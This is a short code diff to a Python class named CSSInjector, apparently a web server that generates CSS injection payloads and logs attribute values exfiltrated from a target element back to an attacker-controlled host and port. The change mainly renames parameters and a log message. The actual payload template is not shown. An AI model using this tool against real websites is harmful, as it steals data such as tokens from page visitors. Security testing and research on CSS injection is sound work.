@@ -10,11 +10,12 @@ class CSSInjector:
         self.clients = Clients()
 
     def start(self, args):
-        self.identifier = args.identifier
         self.hostname = args.hostname
         self.port = args.port
+        self.element = args.element
+        self.attribut = args.attribut
         self.show_details = args.details
-        self.selector = args.selector
+
         self.app = web.Application()
         self.app.middlewares.append(self.dynamic_router_middleware)
         self.console = Console()
@@ -55,7 +56,7 @@ class CSSInjector:
 
         self.console.log(
             "end_exfiltration",
-            f"[{client.id}] - The {self.selector} exfiltrated from {self.identifier} is : {client.data}",
+            f"[{client.id}] - The {self.attribut} exfiltrated from {self.element} is : {client.data}",
         )
         client.data = ""
 
@@ -75,8 +76,8 @@ class CSSInjector:
             text=injection.generate_payload(
                 hostname=self.hostname,
                 port=self.port,
-                identifier=self.identifier,
-                selector=self.selector,
+                element=self.element,
+                attribut=self.attribut,
                 client=client,
             ),
             content_type="text/css",
